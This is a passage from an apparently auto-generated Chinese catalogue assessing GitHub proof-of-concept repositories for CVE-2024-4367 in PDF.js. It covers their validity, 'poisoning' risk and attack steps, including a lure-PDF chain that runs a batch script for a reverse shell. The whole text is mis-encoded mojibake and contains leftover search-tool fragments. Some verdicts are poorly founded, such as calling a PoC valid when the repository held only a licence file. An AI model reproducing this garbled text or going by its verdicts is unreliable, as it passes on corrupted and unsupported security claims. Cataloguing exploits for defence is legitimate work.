    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
